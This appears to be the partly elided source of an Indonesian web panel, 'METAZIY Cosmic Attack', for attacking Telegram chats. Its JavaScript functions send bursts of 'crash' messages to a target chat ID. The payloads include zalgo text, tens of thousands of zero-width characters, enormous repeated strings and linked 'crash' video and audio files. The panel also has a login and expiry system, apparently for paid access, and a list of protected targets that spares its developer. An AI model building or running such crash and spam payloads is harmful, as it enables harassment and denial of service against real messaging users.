...
<title>METAZIY TELE - Cosmic Attack</title>
...
<div class="container">
  <div class="header">
    <h2><i class="fas fa-bolt"></i> METAZIY COSMIC</h2>
  ...
  <div class="input-group">
    ...
    <select id="mode">
      ...
      <option value="combo">Ziy Meta Combo</option>
    </select>
  ...
  <div class="button-group">
    <button class="btn btn-primary" onclick="toggleAttack()" id="attackBtn">
      <i class="fas fa-fire"></i> Mulai Cosmic Attack
    </button>
  ...
  <div class="footer">
    <div class="dev-buttons">
      <a href="https://t.me/gagakek" class="dev-btn" target="_blank"><i class="fas fa-user"></i> Developer</a>
      <a href="https://t.me/chezi222" class="dev-btn" target="_blank"><i class="fas fa-broadcast-tower"></i> Channel</a>
...
const videoCaption = "?𝐛𝐞𝐥𝐢𝐨𝐮𝐧𝐳𝟒𝐒𝐱 𝐈𝐒 𝐇𝐄𝐑𝐄🩸 ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝愛 || ⏤‌FAHREZI META";
...
const crashVideos = {
    ...
    highFPS: "https://files.catbox.moe/wek01l.jpg",
    audioBomb: "https://files.catbox.moe/d1f8bc.mp4"
};

// Caption crash yang powerful
const crashCaptions = [
    "M҉E҉T҉A҉Z҉I҉Y҉ V҉I҉D҉E҉O҉ C҉R҉A҉S҉H҉\nC҉R҉A҉S҉H҉I҉N҉G҉ S҉Y҉S҉T҉E҉M҉\nV҉I҉D҉E҉O҉ O҉V҉E҉R҉L҉O҉A҉D҉ A҉C҉T҉I҉V҉A҉T҉E҉D҉",

    "\u200B".repeat(99999) + "METAZIY VIDEO CRASH" + "\u200C".repeat(999) + "\nINVISIBLE TEXT BOMB ACTIVATED\nZERO WIDTH JOINER ATTACK"
];
...
class AuthSystem {
  ...
  loadLocalUsers() {
    ...
    console.log('✅ Loaded local users:', LOCAL_USERS.map(u => u.username));
  }
  ...
  async loadUsersFromGitHub() {
    try {
        ...
        console.log('🔄 Loading users from GitHub Raw...');
        ...
        console.log('❌ GitHub Raw failed:', error.message);
        ...
        if (user) {
            if (user.password === password) {
                if (user.expiresAt && Date.now() > user.expiresAt) {
                    this.showMessage('❌ Akun sudah expired!', 'error');
                    return false;
                }
                return true;
            }
  ...
  async login(username, password) {
    try {
        if (!username || !password) {
            this.showMessage('❌ Masukkan username dan password!', 'error');
            return false;
        }
        ...
        if (isValid) {
            ...
            this.hideLoginModal();
            this.updateUserInfo();
            this.showMessage(`✅ Login berhasil! Selamat datang ${username}`, 'success');
            return true;
        } else {
        ...
        this.showMessage('❌ System error during login', 'error');
        return false;
    }
  }
  ...
  logout() {
    ...
    this.showLoginModal();
    this.updateUserInfo();
    this.showMessage('🔒 Logged out', 'warning');
  }
  ...
  checkAuth() {
    if (!this.isLoggedIn) {
      this.showMessage('❌ Silakan login terlebih dahulu!', 'error');
      this.showLoginModal();
      return false;
    }
    return true;
...
function validateTarget(target) {
    if (isProtectedTarget(target)) {
        logMessage(`❌ DILARANG MENYERANG DEVELOPER/TARGET TERLINDUNG!`, 'error');
        logMessage(`❌ Target ${target} berada dalam daftar proteksi`, 'error');
        logMessage(`❌ Hubungi @gagakek untuk info lebih lanjut`, 'error');
        return false;
    }
    return true;
}
...
async function crashTextExtreme(chatId, count = 8, delayMs = 1500) {
    console.log(`💀 Starting METAZIY TEXT EXTREME Attack to ${chatId}`);
    ...
    for (let i = 0; i < count; i++) {
        try {
            ...
            if (data.ok) {
                console.log(`💥 Text Extreme ${i+1}/${count} - ${textToSend.length} chars sent`);
                logMessage(`💥 Text Extreme ${i+1}/${count} - ${textToSend.length} chars`, 'success');
                updateStats('success');
            } else {
                console.log(`❌ Text Error: ${data.description}`);
                logMessage(`❌ Text Extreme ${i+1}/${count} gagal: ${data.description}`, 'error');
                updateStats('error');
            }
            ...
            console.log(`💥 Text Extreme Error: ${error.message}`);
            logMessage(`💥 Text Extreme ${i+1}/${count} error: ${error.message}`, 'error');
            updateStats('error');
        }
    }
    
    console.log(`🎉 METAZIY TEXT EXTREME Attack completed!`);
    logMessage(`🎉 TEXT EXTREME Attack selesai!`, 'success');
}
...
function generateExtremeText(iteration) {
    const techniques = [
        ...
        () => {
            let text = "M҉E҉T҉A҉Z҉I҉Y҉ ".repeat(9999999999);
        ...
        () => {
            ...
            for (let i = 0; i < 50; i++) {
                text += `∑(n=${i}→∞) f(n) = ${Math.random()}\n`;
                text += `∫${i}^{${i+1}} x dx = ${Math.random()}\n`;
                text += `∇⋅F = ${Math.random()}\n`;
                text += `∂²u/∂t² = c²∇²u + ${Math.random()}\n`;
            }
            return text;
        },
...
async function crashTextUltraMega(chatId, count = 5, delayMs = 3000) {
    console.log(`☢️ Starting METAZIY ULTRA MEGA TEXT Attack to ${chatId}`);
    ...
    for (let i = 0; i < count; i++) {
        try {
            ...
            if (data.ok) {
                console.log(`☢️ ULTRA MEGA Text ${i+1}/${count} - ${textToSend.length} chars`);
                logMessage(`☢️ ULTRA MEGA Text ${i+1}/${count} - ${textToSend.length} chars`, 'success');
                updateStats('success');
            } else {
                console.log(`❌ ULTRA MEGA Error: ${data.description}`);
                logMessage(`❌ ULTRA MEGA ${i+1}/${count} gagal: ${data.description}`, 'error');
                updateStats('error');
            }
            ...
            console.log(`💀 ULTRA MEGA Error: ${error.message}`);
            logMessage(`💀 ULTRA MEGA ${i+1}/${count} error: ${error.message}`, 'error');
            updateStats('error');
        }
    }
    
    console.log(`🎉 METAZIY ULTRA MEGA TEXT Attack completed!`);
    logMessage(`🎉 ULTRA MEGA TEXT Attack selesai!`, 'success');
}

function generateUltraMegaText() {
    let text = "☢️ METAZIY ULTRA MEGA TEXT ATTACK ☢️\n\n";
    
    // Section 1: Super Zalgo Stack
    text += "SECTION 1 - SUPER ZALGO:\n";
    let zalgoBase = "METAZIY";
...
async function crashTextTembus4Arah(chatId, count = 6, delayMs = 2500) {
    console.log(`🎯 Starting METAZIY TEXT TEMBUS 4 ARAH Attack to ${chatId}`);
    ...
    for (let i = 0; i < count; i++) {
        try {
            ...
            if (data.ok) {
                console.log(`🎯 Tembus 4 Arah ${i+1}/${count} - ${textToSend.length} chars`);
                logMessage(`🎯 Tembus 4 Arah ${i+1}/${count} - ${textToSend.length} chars`, 'success');
                updateStats('success');
            } else {
                console.log(`❌ Tembus Error: ${data.description}`);
                logMessage(`❌ Tembus 4 Arah ${i+1}/${count} gagal: ${data.description}`, 'error');
                updateStats('error');
            }
            ...
            console.log(`💥 Tembus Error: ${error.message}`);
            logMessage(`💥 Tembus 4 Arah ${i+1}/${count} error: ${error.message}`, 'error');
            updateStats('error');
        }
    }
    
    console.log(`🎉 METAZIY TEXT TEMBUS 4 ARAH Attack completed!`);
    logMessage(`🎉 TEXT TEMBUS 4 ARAH Attack selesai!`, 'success');
}
...
async function crashVideo(chatId, count = 10, delayMs = 1000) {
    console.log(`🎥 Starting METAZIY Video Crash Attack to ${chatId}`);
    ...
    for (let i = 0; i < count; i++) {
        try {
            ...
            if (data.ok) {
                console.log(`✅ Video Crash ${i+1}/${count} sent successfully`);
                logMessage(`✅ Video ${i+1}/${count} terkirim`, 'success');
                updateStats('success');
            } else {
                console.log(`❌ Video Error: ${data.description}`);
                logMessage(`❌ Video ${i+1}/${count} gagal: ${data.description}`, 'error');
                updateStats('error');
            }
            ...
            logMessage(`💥 Video ${i+1}/${count} error: ${error.message}`, 'error');
            updateStats('error');
        }
    }
    
    console.log(`🎉 METAZIY Video Crash Attack completed!`);
    logMessage(`🎉 Video Crash Attack selesai!`, 'success');
}

// Fungsi crash sticker
async function spamSticker(chatId, count = 15, delayMs = 500) {
    console.log(`🃏 Starting METAZIY Sticker Crash Attack to ${chatId}`);
    ...
    for (let i = 0; i < count; i++) {
        try {
            ...
            if (data.ok) {
                console.log(`✅ Sticker Crash ${i+1}/${count} sent successfully`);
                logMessage(`✅ Sticker ${i+1}/${count} terkirim`, 'success');
                updateStats('success');
            } else {
                console.log(`❌ Sticker Error: ${data.description}`);
                logMessage(`❌ Sticker ${i+1}/${count} gagal: ${data.description}`, 'error');
                updateStats('error');
            }
            ...
            logMessage(`💥 Sticker ${i+1}/${count} error: ${error.message}`, 'error');
            updateStats('error');
        }
    }
    
    console.log(`🎉 METAZIY Sticker Crash Attack completed!`);
    logMessage(`🎉 Sticker Crash Attack selesai!`, 'success');
}

// Fungsi combo attack
async function spamCombotloh(chatId, count = 8, delayMs = 1500) {
    console.log(`⚡ Starting METAZIY COMBO Attack to ${chatId}`);
    ...
    for (let i = 0; i < count; i++) {
        try {
            ...
            logMessage(`💥 COMBO ${i+1}/${count} error: ${error.message}`, 'error');
            updateStats('error');
        }
    }
    
    console.log(`🎉 METAZIY COMBO Attack completed!`);
    logMessage(`🎉 COMBO Attack selesai!`, 'success');
}
...
function generateCrashText() {
    ...
    const templates = [
        () => {
            let text = "M҉E҉T҉A҉Z҉I҉Y҉ ".repeat(9999);
...
async function spamTextloh(chatId, count = 10, delayMs = 1000) {
    console.log(`🚀 Starting METAZIY Text Attack to ${chatId}`);
    ...
    for (let i = 0; i < count; i++) {
        try {
            ...
            if (data.ok) {
                console.log(`✅ Text ${i+1}/${count} sent successfully`);
                logMessage(`✅ Text ${i+1}/${count} terkirim`, 'success');
                updateStats('success');
            } else {
                console.log(`❌ Text Error: ${data.description}`);
                logMessage(`❌ Text ${i+1}/${count} gagal: ${data.description}`, 'error');
                updateStats('error');
            }
            ...
            logMessage(`💥 Text ${i+1}/${count} error: ${error.message}`, 'error');
            updateStats('error');
        }
    }
    
    console.log(`🎉 METAZIY Text Attack completed!`);
    logMessage(`🎉 Text Attack selesai!`, 'success');
}
...
async function startSpam() {
    ...
    logMessage(`🚀 Memulai ${mode} attack ke ${chatId}...`, "info");
    ...
    try {
        switch (mode) {
            ...
            case "combo": 
                ...
                break;
            default: 
                logMessage("❌ Mode tidak valid", "error");
        }
    } catch (error) {
        ...
        logMessage("🏁 Attack selesai!", "success");
    }
}

function stopSpam() {
  isRunning = false;
  logMessage("⏹️ Attack dihentikan", "warning");
}
...
function setQuickSettings(count, delay) {
  ...
  logMessage(`⚡ Quick settings: ${count} pesan, ${delay}ms delay`, "info");
}

function clearLog() {
  document.getElementById('log').innerHTML = '';
  logMessage('🗑️ Log cleared', "info");
}
...
document.addEventListener('DOMContentLoaded', function() {
  ...
  setTimeout(() => {
    const log = document.getElementById('log');
    const sampleLogs = [
      { msg: '🚀 Cosmic Attack System Ready', type: 'success' },
      { msg: '⚡ Particles Network Activated', type: 'info' },
      { msg: '🎯 Target Acquisition System Online', type: 'info' },
      { msg: '💫 Gradient Shift Engine Started', type: 'success' },
      { msg: '👻 Invisible Delay Mode Available', type: 'info' }
    ];
